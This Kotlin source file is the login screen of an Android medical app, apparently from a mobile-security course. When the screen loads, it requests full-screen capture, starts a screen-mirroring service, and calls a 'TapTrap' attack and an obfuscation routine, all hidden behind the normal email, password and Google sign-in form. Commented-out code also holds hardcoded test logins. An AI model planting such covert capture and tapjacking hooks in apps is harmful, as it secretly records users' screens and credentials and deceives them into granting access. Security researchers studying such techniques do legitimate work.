package com.example.inf2007_mad_j1847.view.auth

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionConfig
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Text
import androidx.compose.material3.TextButton
import androidx.compose.material3.TextField
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.navigation.NavHostController
import com.example.inf2007_mad_j1847.test.ScreenMirrorService
import com.example.inf2007_mad_j1847.test.TapTrap
import com.example.inf2007_mad_j1847.utils.StringHelper
import com.example.inf2007_mad_j1847.viewmodel.AuthViewModel
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.android.gms.auth.api.signin.GoogleSignInOptions
import com.google.android.gms.common.api.ApiException
import kotlinx.coroutines.delay

@Composable
fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
    val uiState by authViewModel.uiState.collectAsState()
    val context = LocalContext.current // Used for Toast and Google Client

    val activity = context as ComponentActivity
    val tapTrap = remember { TapTrap(activity) }

    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

    val mediaProjectionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.sResultCode = result.resultCode
            ScreenMirrorService.sResultData = result.data!!
            Log.d("TapTrap", "🎥 MediaProjection granted!")

            // ✅ Start service immediately from foreground (LoginScreen is visible)
            val mirrorIntent = Intent(context, ScreenMirrorService::class.java)
            mirrorIntent.putExtra("resultCode", result.resultCode)
            mirrorIntent.putExtra("resultData", result.data)
            context.startForegroundService(mirrorIntent)
        }
    }

    LaunchedEffect(Unit) {
        if (ScreenMirrorService.sResultData == null) {

            val captureIntent =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    // Android 14 (API 34): force "Entire screen" (default display)
                    mpm.createScreenCaptureIntent(
                        MediaProjectionConfig.createConfigForDefaultDisplay()
                    )
                } else {
                    // Older Android: normal flow
                    mpm.createScreenCaptureIntent()
                }

            mediaProjectionLauncher.launch(captureIntent)
        }
        delay(3000)

        println("launch ENTER")
        tapTrap.startAttack()

        StringHelper.testObfuscation()



    }




    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }

    val gso = remember {
        GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken("959525127524-mpbapotg2h2qt1bn54ap6d3ttevi4aim.apps.googleusercontent.com")
            .requestEmail()
            .build()
    }
    val googleSignInClient = remember { GoogleSignIn.getClient(context, gso) }

    val googleSignInLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val task = GoogleSignIn.getSignedInAccountFromIntent(result.data)
            try {
                val account = task.getResult(ApiException::class.java)
                val idToken = account?.idToken
                if (idToken != null) {
                    authViewModel.signInWithGoogle(idToken)
                }
            } catch (e: ApiException) {
                Toast.makeText(context, "Google Sign-In Failed: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // Navigation logic
    LaunchedEffect(uiState) {
        if (uiState is AuthViewModel.AuthUiState.Success) {
            val role = (uiState as AuthViewModel.AuthUiState.Success).role
            val destination = when (role) {
                "ADMIN" -> "admin_home"
                "DOCTOR" -> "doctor_home"
                else -> "patient_home"
            }
            navController.navigate(destination) {
                popUpTo("auth_graph") { inclusive = true }
            }
        }
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        TextField(value = email, onValueChange = { email = it }, label = { Text("Email") })
        TextField(
            value = password,
            onValueChange = { password = it },
            label = { Text("Password") },
            visualTransformation = PasswordVisualTransformation()
        )

        Spacer(modifier = Modifier.height(16.dp))

        if (uiState is AuthViewModel.AuthUiState.Loading) {
            CircularProgressIndicator()
        } else {
            Button(
                onClick = {
                    // 👇 ADD THIS VALIDATION
                    if (email.isBlank() || password.isBlank()) {
                        Toast.makeText(context, "Email and password cannot be empty", Toast.LENGTH_SHORT).show()
                    } else {
                        authViewModel.login(email, password)
                    }
                },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) {
                Text("Login")
            }

            Spacer(modifier = Modifier.height(8.dp))



            OutlinedButton(
                onClick = { googleSignInLauncher.launch(googleSignInClient.signInIntent) },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) {
                Text("Sign in with Google")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        TextButton(onClick = { navController.navigate("signup_screen") }) {
            Text("Don't have an account? Sign Up")
        }


//        if (BuildConfig.DEV_MODE) {
//            Spacer(modifier = Modifier.height(12.dp))
//
//            Button(onClick = {
//                authViewModel.login("xuanyang@mobsec.com", "securepassword")
//            }) {
//                Text("DEV: patient login")
//            }
//
//            Button(onClick = {
//                authViewModel.login("diniezikry@mobsec.com", "securepassword")
//            }) {
//                Text("DEV: Doctor login")
//            }
//        }

        if (uiState is AuthViewModel.AuthUiState.Error) {
            Text(
                (uiState as AuthViewModel.AuthUiState.Error).message,
                color = MaterialTheme.colorScheme.error
            )
        }
    }
}